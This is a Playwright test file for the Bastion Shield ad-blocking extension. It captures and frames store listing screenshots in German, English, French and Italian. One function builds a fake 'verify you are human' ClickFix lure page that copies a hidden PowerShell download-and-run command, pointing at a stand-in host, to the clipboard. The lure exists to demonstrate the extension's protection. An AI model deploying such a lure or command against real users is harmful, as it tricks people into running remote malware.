// Bastion Shield e2e — store listing images for the Chrome Web Store and
// Microsoft Edge Add-ons. Runs only with BASTION_STORE_IMAGES=<dir>:
//
//   BASTION_STORE_IMAGES=store/images npm run test:e2e -- 90-store-images
//
// For each listing language (de, en, fr, it) it captures the real extension
// UI (popup on a page with trackers, overview, live activity, ClickFix
// notice, managed privacy settings), then sets each capture in a branded
// 1280×800 frame with a caption. It also renders the promo tiles (440×280,
// 1400×560), the store icon (128×128) and the Edge logo (300×300).
// store/README.md says where each file goes.
//
// SPDX-FileCopyrightText: 2026 Bastion Security GmbH and contributors
// SPDX-License-Identifier: GPL-3.0-or-later

import { mkdirSync, readFileSync } from 'node:fs';
import path from 'node:path';
import type { Page } from '@playwright/test';
import { ExtensionHarness } from '../support/extension.ts';
import { expect, test } from '../support/fixtures.ts';
import { loadResources } from '../support/pages.ts';
import { REPO_ROOT } from '../support/paths.ts';

const OUT = process.env.BASTION_STORE_IMAGES ? path.resolve(REPO_ROOT, process.env.BASTION_STORE_IMAGES) : '';

type Lang = 'de' | 'en' | 'fr' | 'it';
const LANGS: Lang[] = ['de', 'en', 'fr', 'it'];

/** Fictional news sites, so no real publisher appears in the listing. */
const NEWS_HOST: Record<Lang, string> = {
  de: 'www.news-beispiel.ch',
  en: 'www.news-example.com',
  fr: 'www.journal-exemple.ch',
  it: 'www.notizie-esempio.ch',
};

/** Ad and tracking endpoints a typical news page loads; the default lists block them. */
const TRACKERS: { host: string; path: string; kind: 'script' | 'img' | 'fetch' }[] = [
  { host: 'securepubads.g.doubleclick.net', path: '/tag/js/gpt.js', kind: 'script' },
  { host: 'www.googletagmanager.com', path: '/gtm.js?id=GTM-ABC123', kind: 'script' },
  { host: 'www.google-analytics.com', path: '/analytics.js', kind: 'script' },
  { host: 'connect.facebook.net', path: '/en_US/fbevents.js', kind: 'script' },
  { host: 'pagead2.googlesyndication.com', path: '/pagead/js/adsbygoogle.js', kind: 'script' },
  { host: 'ad.doubleclick.net', path: '/ddm/trackimp/pixel.gif', kind: 'img' },
  { host: 'static.criteo.net', path: '/js/ld/publishertag.js', kind: 'script' },
  { host: 'sb.scorecardresearch.com', path: '/beacon.js', kind: 'script' },
  { host: 'cdn.taboola.com', path: '/libtrc/news/loader.js', kind: 'script' },
  { host: 'widgets.outbrain.com', path: '/outbrain.js', kind: 'script' },
  { host: 'c.amazon-adsystem.com', path: '/aax2/apstag.js', kind: 'script' },
  { host: 'ib.adnxs.com', path: '/ut/v3', kind: 'fetch' },
  { host: 'static.hotjar.com', path: '/c/hotjar-1.js', kind: 'script' },
  { host: 'bat.bing.com', path: '/bat.js', kind: 'script' },
  { host: 'snap.licdn.com', path: '/li.lms-analytics/insight.min.js', kind: 'script' },
  { host: 'analytics.tiktok.com', path: '/i18n/pixel/events.js', kind: 'script' },
  { host: 'cdn.mxpnl.com', path: '/libs/mixpanel-2-latest.min.js', kind: 'script' },
  { host: 'www.googleadservices.com', path: '/pagead/conversion.js', kind: 'script' },
  { host: 'secure.quantserve.com', path: '/quant.js', kind: 'script' },
  { host: 'pixel.adsafeprotected.com', path: '/services/pub', kind: 'img' },
  { host: 'cdn.permutive.com', path: '/news-web.js', kind: 'script' },
  { host: 'adservice.google.com', path: '/adsid/integrator.js', kind: 'script' },
];

/** Caption per screenshot and language: title (one line) and one sentence. */
const CAPTIONS: Record<string, Record<Lang, [string, string]>> = {
  popup: {
    de: ['Blockiert Werbung und Tracker.', 'Pro Website ein- und ausschaltbar, mit Zähler und den Modi Standard und Aggressiv.'],
    en: ['Blocks ads and trackers.', 'Switch protection per site, with a live count and Standard or Aggressive mode.'],
    fr: ['Bloque publicités et traqueurs.', 'Protection activable par site, avec compteur en direct et mode Standard ou Agressif.'],
    it: ['Blocca pubblicità e tracker.', 'Protezione attivabile per sito, con contatore in tempo reale e modalità Standard o Aggressiva.'],
  },
  overview: {
    de: ['Sehen, was blockiert wurde.', 'Lokale Statistik der letzten 30 Tage. Keine Daten verlassen Ihr Gerät.'],
    en: ['See what was blocked.', 'Local statistics for the last 30 days. No data leaves your device.'],
    fr: ['Voyez ce qui a été bloqué.', 'Statistiques locales des 30 derniers jours. Aucune donnée ne quitte votre appareil.'],
    it: ['Scopra cosa è stato bloccato.', 'Statistiche locali degli ultimi 30 giorni. Nessun dato lascia il suo dispositivo.'],
  },
  activity: {
    de: ['Jede Anfrage nachvollziehbar.', 'Mit der Filterliste und der Regel, die gegriffen hat.'],
    en: ['Every request, explained.', 'With the filter list and the exact rule that matched.'],
    fr: ['Chaque requête expliquée.', 'Avec la liste de filtres et la règle exacte qui s’est appliquée.'],
    it: ['Ogni richiesta spiegata.', 'Con la lista di filtri e la regola esatta che è stata applicata.'],
  },
  clickfix: {
    de: ['Stoppt ClickFix-Angriffe.', 'Blockiert gefährliche Befehle, die Websites heimlich in die Zwischenablage legen.'],
    en: ['Stops ClickFix attacks.', 'Blocks dangerous commands that websites secretly put on your clipboard.'],
    fr: ['Bloque les attaques ClickFix.', 'Bloque les commandes dangereuses que des sites cachent dans le presse-papiers.'],
    it: ['Ferma gli attacchi ClickFix.', 'Blocca i comandi pericolosi che i siti copiano di nascosto negli appunti.'],
  },
  managed: {
    de: ['Zentral verwaltbar mit Intune.', 'Einstellungen per Richtlinie setzen und sperren, für Edge, Chrome und Brave.'],
    en: ['Managed centrally with Intune.', 'Set and lock every setting by policy, for Edge, Chrome and Brave.'],
    fr: ['Gestion centralisée avec Intune.', 'Définissez et verrouillez chaque réglage par stratégie, pour Edge, Chrome et Brave.'],
    it: ['Gestione centralizzata con Intune.', 'Imposti e blocchi ogni impostazione tramite criteri, per Edge, Chrome e Brave.'],
  },
};

const TAGLINE: Record<Lang, string> = {
  de: 'Schneller, transparenter Werbe- und Trackerblocker',
  en: 'Fast, transparent ad and tracker blocker',
  fr: 'Bloqueur de publicités et de traqueurs, rapide et transparent',
  it: 'Blocco di pubblicità e tracker, veloce e trasparente',
};

const SHOTS = ['popup', 'overview', 'activity', 'clickfix', 'managed'] as const;

/** The 360px popup is captured at 1.5× so the frame can show it large and sharp. */
const POPUP_ZOOM = 1.5;
const POPUP_W = 360 * POPUP_ZOOM;

/** A typical ClickFix lure: a fake human check that copies a command on click. Neutral design, no real brand. */
function lurePage(lang: Lang): string {
  const t = {
    de: ['Bestätigen Sie, dass Sie ein Mensch sind', 'Ich bin kein Roboter', 'Verifizierung abschliessen:', ['Drücken Sie Windows + R', 'Drücken Sie Ctrl + V', 'Drücken Sie Enter']],
    en: ['Verify you are human', 'I am not a robot', 'Complete the verification:', ['Press Windows + R', 'Press Ctrl + V', 'Press Enter']],
    fr: ['Confirmez que vous êtes humain', 'Je ne suis pas un robot', 'Terminez la vérification :', ['Appuyez sur Windows + R', 'Appuyez sur Ctrl + V', 'Appuyez sur Entrée']],
    it: ['Confermi di essere una persona', 'Non sono un robot', 'Completi la verifica:', ['Prema Windows + R', 'Prema Ctrl + V', 'Prema Invio']],
  }[lang] as [string, string, string, string[]];
  return `<!doctype html><html lang="${lang}"><head><meta charset="utf-8"><title>verify.example-captcha.com</title>
<style>
  body { margin: 0; font: 15px/1.5 system-ui, "Segoe UI", sans-serif; background: #F3F4F6; color: #1F2937; }
  main { max-width: 460px; margin: 120px auto 0; background: #FFF; border: 1px solid #D1D5DB; border-radius: 8px; padding: 32px; box-shadow: 0 4px 16px rgba(0,0,0,.06); }
  h1 { font-size: 22px; margin: 0 0 20px; }
  label { display: flex; align-items: center; gap: 12px; border: 1px solid #D1D5DB; border-radius: 6px; padding: 16px; cursor: pointer; }
  input { width: 22px; height: 22px; }
  ol { margin: 20px 0 0; padding-left: 20px; } .steps { display: none; } .steps.on { display: block; }
  .host { margin-top: 24px; font-size: 12px; color: #6B7280; text-align: center; }
</style></head><body><main>
  <h1>${t[0]}</h1>
  <label><input type="checkbox" id="human">${t[1]}</label>
  <div class="steps" id="steps"><p style="margin:20px 0 0">${t[2]}</p><ol>${t[3].map((s) => `<li>${s}</li>`).join('')}</ol></div>
  <p class="host">verify.example-captcha.com</p>
</main><script>
  document.getElementById('human').addEventListener('click', () => {
    navigator.clipboard.writeText('powershell -w hidden -c "iwr https://cdn.example-captcha.com/verify.ps1 | iex" # Human check ID 4821').catch(() => {});
    document.getElementById('steps').classList.add('on');
  });
</script></body></html>`;
}

// ---------------------------------------------------------------------------
// Captures
// ---------------------------------------------------------------------------

function dayKey(d: Date): string {
  return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, '0')}-${String(d.getDate()).padStart(2, '0')}`;
}

/** 30 plausible days of history for the overview (the real history only has today). */
function history(lang: Lang): unknown {
  const site = NEWS_HOST[lang].replace(/^www\./, '');
  const hosts = ['securepubads.g.doubleclick.net', 'www.google-analytics.com', 'www.googletagmanager.com', 'connect.facebook.net', 'static.criteo.net', 'cdn.taboola.com', 'sb.scorecardresearch.com', 'c.amazon-adsystem.com', 'static.hotjar.com', 'bat.bing.com'];
  const sites = [site, 'wetter-beispiel.ch', 'shop-beispiel.ch', 'rezepte-beispiel.ch', 'sport-beispiel.ch'];
  const now = new Date();
  const days = [];
  let sum = 0;
  for (let i = 29; i >= 0; i--) {
    const d = new Date(now.getFullYear(), now.getMonth(), now.getDate() - i, 12);
    const weekend = d.getDay() === 0 || d.getDay() === 6;
    const total = Math.round((weekend ? 420 : 760) + ((i * 7919) % 280));
    sum += total;
    const byHost: Record<string, number> = {};
    hosts.forEach((h, k) => (byHost[h] = Math.round(total * (0.2 - k * 0.016))));
    const bySite: Record<string, number> = {};
    sites.forEach((s, k) => (bySite[s] = Math.round(total * (0.42 - k * 0.08))));
    const byType = { script: Math.round(total * 0.55), image: Math.round(total * 0.2), xmlhttprequest: Math.round(total * 0.17), sub_frame: Math.round(total * 0.08) };
    days.push({
      day: dayKey(d),
      total,
      byKind: { blocked: Math.round(total * 0.9), stripped: Math.round(total * 0.07), redirected: Math.round(total * 0.03) },
      byCategory: { ads: Math.round(total * 0.52), privacy: Math.round(total * 0.38), security: 3, annoyances: Math.round(total * 0.08) },
      byHost,
      bySite,
      byType,
      savedByType: byType,
    });
  }
  return { days, totals: { since: now.getTime() - 30 * 86_400_000, blocked: sum, byKind: {} } };
}

/** Lets a page answer selected service-worker messages from `window.__bsMock` / merge `window.__bsPatch`. */
function mockRuntime(): void {
  const w = window as unknown as { __bsMock?: Record<string, unknown>; __bsPatch?: Record<string, unknown> };
  try {
    const rt = chrome.runtime as unknown as { sendMessage: (m: { type: string }) => Promise<unknown> };
    const orig = rt.sendMessage.bind(rt);
    const merge = (a: unknown, b: unknown): unknown => {
      if (!b || typeof b !== 'object' || Array.isArray(b)) return b;
      const o = (a && typeof a === 'object' ? a : {}) as Record<string, unknown>;
      for (const k of Object.keys(b)) o[k] = merge(o[k], (b as Record<string, unknown>)[k]);
      return o;
    };
    rt.sendMessage = (msg) => {
      const m = w.__bsMock ?? {};
      if (msg && Object.prototype.hasOwnProperty.call(m, msg.type)) return Promise.resolve(JSON.parse(JSON.stringify(m[msg.type])));
      const pt = (w.__bsPatch ?? {})[msg?.type];
      return pt ? orig(msg).then((r) => merge(r, JSON.parse(JSON.stringify(pt)))) : orig(msg);
    };
  } catch {
    /* not an extension page */
  }
}

async function openDashboard(page: Page, origin: string, view: string, setup: { mock?: Record<string, unknown>; patch?: Record<string, unknown> } = {}): Promise<void> {
  await page.setViewportSize({ width: 1280, height: 800 });
  await page.emulateMedia({ colorScheme: 'light', reducedMotion: 'reduce' });
  await page.addInitScript((d) => {
    const w = window as unknown as Record<string, unknown>;
    w.__bsMock = d.mock ?? {};
    if (d.patch) w.__bsPatch = d.patch;
  }, setup);
  await page.addInitScript(mockRuntime);
  await page.goto(`${origin}/ui/dashboard.html#${view}`, { waitUntil: 'load' });
  await expect(page.locator('#db-view')).toHaveAttribute('aria-busy', 'false', { timeout: 10_000 });
  await page.waitForTimeout(600);
}

// ---------------------------------------------------------------------------
// Frames
// ---------------------------------------------------------------------------

const RING = 'M 55.00 76.50 L 60.55 76.50 L 76.50 60.55 L 76.50 39.45 L 60.55 23.50 L 39.45 23.50 L 23.50 39.45 L 23.50 60.55 L 39.45 76.50 L 45.00 76.50 L 45.00 83.50 L 36.55 83.50 L 16.50 63.45 L 16.50 36.55 L 36.55 16.50 L 63.45 16.50 L 83.50 36.55 L 83.50 63.45 L 63.45 83.50 L 55.00 83.50 Z';
const mark = (size: number, ring: string, core: string) =>
  `<svg width="${size}" height="${size}" viewBox="0 0 100 100" aria-hidden="true"><path fill="${ring}" fill-rule="evenodd" d="${RING}"/><path fill="${core}" d="M 50 40 L 60 50 L 50 60 L 40 50 Z"/></svg>`;

function fontFaces(): string {
  const font = (file: string) => readFileSync(path.join(REPO_ROOT, 'src', 'ui', 'shared', 'fonts', file)).toString('base64');
  return `
    @font-face { font-family: "Brand"; src: url(data:font/woff2;base64,${font('inter-tight-latin-wght.woff2')}) format("woff2"); font-weight: 100 900; }
    @font-face { font-family: "Text"; src: url(data:font/woff2;base64,${font('inter-latin-wght.woff2')}) format("woff2"); font-weight: 100 900; }`;
}

const BASE_CSS = `
  * { box-sizing: border-box; margin: 0; }
  html, body { width: 100%; height: 100%; }
  body { background: #171C1E; color: #FFFFFF; font-family: "Text", system-ui, sans-serif; -webkit-font-smoothing: antialiased; overflow: hidden; }
  .brand { display: flex; align-items: center; gap: 10px; font-family: "Brand"; font-weight: 600; font-size: 18px; letter-spacing: -0.018em; color: #D7DDDF; }
  h1 { font-family: "Brand"; font-weight: 600; letter-spacing: -0.028em; line-height: 1.08; color: #FFFFFF; }
  p { color: #A9B6BA; line-height: 1.45; }
  .shot { border-radius: 12px; border: 1px solid rgba(215, 221, 223, 0.18); box-shadow: 0 1px 2px rgba(0, 0, 0, 0.4), 0 24px 64px rgba(0, 0, 0, 0.45); display: block; }
`;

async function render(page: Page, html: string, w: number, h: number, file: string, omitBackground = false): Promise<void> {
  await page.setViewportSize({ width: w, height: h });
  await page.setContent(`<!doctype html><html><head><meta charset="utf-8"><style>${fontFaces()}${BASE_CSS}</style></head><body>${html}</body></html>`, { waitUntil: 'load' });
  await page.evaluate(() => document.fonts.ready);
  await page.waitForTimeout(100);
  mkdirSync(path.dirname(file), { recursive: true });
  await page.screenshot({ path: file, omitBackground });
}

const dataUrl = (file: string) => `data:image/png;base64,${readFileSync(file).toString('base64')}`;
const esc = (s: string) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;');

/** Caption beside a narrow capture (the popup). */
function splitFrame(img: string, imgW: number, imgH: number, title: string, sub: string): string {
  const scale = Math.min(1, 680 / imgH);
  return `
    <div style="display:flex;height:800px;align-items:center;padding:0 96px;gap:88px">
      <div style="flex:1;display:flex;flex-direction:column;gap:28px">
        <div class="brand" translate="no">${mark(30, '#D7DDDF', '#E6392E')}Bastion Shield</div>
        <h1 style="font-size:56px">${esc(title)}</h1>
        <p style="font-size:22px;max-width:520px">${esc(sub)}</p>
      </div>
      <img class="shot" src="${img}" width="${Math.round(imgW * scale)}" height="${Math.round(imgH * scale)}">
    </div>`;
}

/** Caption above a wide capture (1280×800, shown at 76 %). */
function stackFrame(img: string, title: string, sub: string): string {
  return `
    <div style="height:800px;display:flex;flex-direction:column;align-items:center;padding-top:44px">
      <div style="width:973px;display:flex;align-items:flex-end;justify-content:space-between;gap:40px">
        <div style="display:flex;flex-direction:column;gap:10px">
          <h1 style="font-size:40px">${esc(title)}</h1>
          <p style="font-size:19px">${esc(sub)}</p>
        </div>
        <div class="brand" translate="no" style="flex:none;padding-bottom:4px">${mark(26, '#D7DDDF', '#E6392E')}Bastion Shield</div>
      </div>
      <img class="shot" src="${img}" width="973" height="608" style="margin-top:32px">
    </div>`;
}

// ---------------------------------------------------------------------------

test.describe('store listing images', () => {
  test('capture and frame', async ({ ext, server, page }) => {
    test.skip(!OUT, 'BASTION_STORE_IMAGES not set');
    test.setTimeout(600_000);
    const raw = path.join(OUT, 'raw');
    const frame = await ext.context.newPage();
    const popupH = {} as Record<Lang, number>;
    const wrapped: string[] = [];

    for (const lang of LANGS) {
      await ext.sendAndApply({ type: 'settings:set', patch: { ui: { language: lang, activityLog: true, badge: true }, history: { enabled: true } } }, 3000);
      const dir = path.join(raw, lang);
      mkdirSync(dir, { recursive: true });

      // A news page with the usual ads and trackers; the real rules block them.
      const host = NEWS_HOST[lang];
      await page.setViewportSize({ width: 1280, height: 800 });
      await loadResources(page, server, host, TRACKERS.map((t) => ({ url: server.url(t.host, t.path), kind: t.kind, label: t.host })), { title: host, settleMs: 800 });
      const tabId = await ext.tabIdOf(page);

      // 1. Popup for that tab, as tall as its content, rendered at 1.5× so
      //    it stays sharp at the size the frame shows it.
      const popup = await ext.context.newPage();
      await popup.setViewportSize({ width: POPUP_W, height: 960 });
      await popup.emulateMedia({ colorScheme: 'light', reducedMotion: 'reduce' });
      await popup.goto(`${ext.origin}/ui/popup.html?tabId=${tabId}`);
      await expect(popup.locator('#pp-host')).toContainText(host);
      await popup.evaluate((z) => void (document.documentElement.style.zoom = String(z)), POPUP_ZOOM);
      await popup.waitForTimeout(1200);
      // With zoom on the root, Chromium reports the box already zoomed.
      const h = await popup.evaluate(() => Math.ceil(document.body.getBoundingClientRect().height));
      await popup.setViewportSize({ width: POPUP_W, height: h });
      await popup.waitForTimeout(200);
      await popup.screenshot({ path: path.join(dir, 'popup.png') });
      await popup.close();
      popupH[lang] = h;

      // 2. Overview with 30 days of history.
      const ov = await ext.context.newPage();
      await openDashboard(ov, ext.origin, 'overview', { mock: { 'history:query': history(lang) } });
      await ov.screenshot({ path: path.join(dir, 'overview.png') });
      await ov.close();

      // 5. Privacy settings as an organisation manages them.
      const cfg = await ext.send<{ settings: { privacy: Record<string, unknown> } }>({ type: 'config:get' });
      const locked = Object.keys(cfg.settings.privacy).map((k) => `privacy.${k}`);
      const mg = await ext.context.newPage();
      await openDashboard(mg, ext.origin, 'privacy', { patch: { 'config:get': { managed: { organizationName: 'Muster AG', lockSettings: true }, locked } } });
      await mg.screenshot({ path: path.join(dir, 'managed.png') });
      await mg.close();
    }

    // 3 and 4 run in a fresh browser per language: in-page notices follow the
    // browser's UI language, and the activity view names the matching list
    // only while Chromium's getMatchedRules quota (20 calls per 10 minutes)
    // lasts, which one browser would use up after the first language.
    for (const lang of LANGS) {
      const browser = await ExtensionHarness.launch({ port: server.port, extraArgs: [`--lang=${lang}`] });
      try {
        await browser.waitUntilReady(20_000);
        await browser.sendAndApply({ type: 'settings:set', patch: { ui: { language: lang, activityLog: true, badge: true } } }, 3000);

        // 3. Live activity: the requests the news page made, with list and rule.
        const news = await browser.context.newPage();
        await news.setViewportSize({ width: 1280, height: 800 });
        await loadResources(news, server, NEWS_HOST[lang], TRACKERS.map((t) => ({ url: server.url(t.host, t.path), kind: t.kind, label: t.host })), { title: NEWS_HOST[lang], settleMs: 800 });
        const act = await browser.context.newPage();
        await openDashboard(act, browser.origin, 'activity');
        await act.waitForTimeout(1500);
        await act.screenshot({ path: path.join(raw, lang, 'activity.png') });
        await act.close();
        await news.close();

        // 4. ClickFix: a fake verification page puts a PowerShell command on the clipboard.
        const url = server.setPage('verify.example-captcha.com', `/check-${lang}.html`, lurePage(lang));
        await browser.context.grantPermissions(['clipboard-read', 'clipboard-write'], { origin: new URL(url).origin });
        const cf = await browser.context.newPage();
        await cf.setViewportSize({ width: 1280, height: 800 });
        await cf.emulateMedia({ colorScheme: 'light', reducedMotion: 'reduce' });
        await cf.goto(url);
        await cf.bringToFront();
        await cf.locator('#human').click();
        await cf.waitForTimeout(1500);
        await cf.screenshot({ path: path.join(raw, lang, 'clickfix.png'), animations: 'disabled' });
      } finally {
        await browser.close();
      }
    }

    for (const lang of LANGS) {
      const dir = path.join(raw, lang);
      const h = popupH[lang];

      // Frames.
      for (const [i, name] of SHOTS.entries()) {
        const [title, sub] = CAPTIONS[name][lang];
        const src = path.join(dir, `${name}.png`);
        const html = name === 'popup' ? splitFrame(dataUrl(src), POPUP_W, h, title, sub) : stackFrame(dataUrl(src), title, sub);
        await render(frame, html, 1280, 800, path.join(OUT, lang, `screenshot-${i + 1}-${name}.png`));
        if (name !== 'popup' && (await frame.evaluate(() => Array.from(document.querySelectorAll('h1, p')).some((el) => el.getClientRects().length > 1 || el.getBoundingClientRect().height > 60)))) {
          wrapped.push(`${lang}/${name}`);
        }
      }

      // Promo tiles.
      await render(
        frame,
        `<div style="height:280px;padding:0 40px;display:flex;flex-direction:column;justify-content:center;gap:16px">
           <div style="display:flex;align-items:center;gap:14px">${mark(56, '#D7DDDF', '#E6392E')}<span translate="no" style="font-family:Brand;font-weight:600;font-size:36px;letter-spacing:-0.028em">Bastion Shield</span></div>
           <p style="font-size:17px;max-width:360px">${esc(TAGLINE[lang])}</p>
         </div>`,
        440,
        280,
        path.join(OUT, lang, 'promo-small-440x280.png'),
      );
      await render(
        frame,
        `<div style="height:560px;display:flex;align-items:center;padding:0 96px;gap:72px">
           <div style="flex:1;display:flex;flex-direction:column;gap:24px">
             <div style="display:flex;align-items:center;gap:18px">${mark(80, '#D7DDDF', '#E6392E')}<span translate="no" style="font-family:Brand;font-weight:600;font-size:60px;letter-spacing:-0.028em">Bastion Shield</span></div>
             <p style="font-size:26px;max-width:600px">${esc(TAGLINE[lang])}</p>
             <p style="font-size:17px;color:#D7DDDF">Bastion Security GmbH, Zürich</p>
           </div>
           <img class="shot" src="${dataUrl(path.join(dir, 'popup.png'))}" width="${Math.round((POPUP_W * 460) / h)}" height="460">
         </div>`,
        1400,
        560,
        path.join(OUT, lang, 'promo-marquee-1400x560.png'),
      );
    }

    // Icons (language-independent, transparent). The mark fills two thirds of
    // its box, which leaves the padding the Chrome Web Store asks for.
    const icon = (size: number) => `<style>body { background: transparent; }</style>${mark(size, '#6E7A80', '#DA291C')}`;
    await render(frame, icon(128), 128, 128, path.join(OUT, 'store-icon-128.png'), true);
    await render(frame, icon(300), 300, 300, path.join(OUT, 'edge-logo-300.png'), true);
    await frame.close();

    // Every caption fits on one line, so no frame pushes its capture off the bottom.
    expect(wrapped, 'captions that wrap').toEqual([]);
  });
});
